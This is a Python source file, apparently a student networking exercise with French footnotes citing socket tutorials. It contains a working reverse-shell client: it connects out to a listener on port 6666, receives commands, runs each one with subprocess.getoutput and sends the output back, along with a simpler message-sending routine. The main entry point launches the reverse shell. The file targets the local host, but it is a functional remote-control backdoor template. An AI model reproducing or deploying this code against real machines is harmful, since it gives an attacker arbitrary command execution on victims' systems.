#!/usr/bin/env python
# coding=utf-8


__author__ = 'Karl Boulais'

import socket
import os
import subprocess
import sys


class Client():
    def __init__(self):
        pass

    
    def sendingData(self):
        s = socket.socket()
        ip = socket.gethostname()
        host = ip
        port = 9999
        quitting = False
        s.connect((host, port))

        while not quitting:
            message = input('> ')
            if message == "exit":
                quitting = True
                s.send(b'exit')
                s.close

            s.send(bytes(message, "UTF-8"))

    
    def sendingReverseShell(self):
        s = socket.socket()
        ip = socket.gethostname()
        host = ip
        port = 6666
        quitting = False
        s.connect((host, port))
        SEP = "<sep>"
        output = ""
        first = True

        while not quitting:
            cwd = os.getcwd()
            
            if first:
                first = False
                message = f"{cwd}"
            else:
                message = f"{output}{SEP}{cwd}"

            s.send(bytes(message, "UTF-8"))

            # Waiting for a command
            command = s.recv(1024).decode("UTF-8")
            commandArgs = command.split()

            if command.lower() == "exit":
                quitting = True
                s.send(b'exit')
                s.close()
            if commandArgs[0].lower() == "cd":
                try:
                    os.chdir(' '.join(commandArgs[1:]))
                except Exception as e:
                    if e == FileNotFoundError: 
                        output = str(e)
                    else:
                        output = ""
            else:
                output = subprocess.getoutput(command)
            

    def main(self):
        # [1]_ [2]_
        self.sendingReverseShell()

if __name__ == "__main__":
   Client().main()


'''
.. rubric:: Notes de bas de page

.. [1]  https://www.tutorialspoint.com/python_network_programming/python_sockets_programming.htm 
        Principe de base d'une connexion TCP avec le module socket
.. [2]  https://gist.github.com/Integralist/3f004c3594bbf8431c15ed6db15809ae
        Utilisation de thread pour prendre en charge plusieurs connexions client à la fois
'''